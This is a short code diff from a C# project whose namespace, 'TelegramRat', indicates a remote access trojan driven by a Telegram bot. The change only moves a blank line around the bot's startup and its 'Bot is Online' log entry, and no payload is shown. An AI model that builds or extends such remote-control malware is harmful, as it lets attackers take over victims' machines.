@@ -107,8 +107,8 @@ namespace TelegramRat
                     Thread.Sleep(WORK_WAIT_TIME);
                 }
             });
+            
             TelegramBot.StartReceiving(UpdateHandler, ErrorHandler, receiverOptions);
-
             LogToFile(LogsPath, "\nBot is Online\n");
         }
         
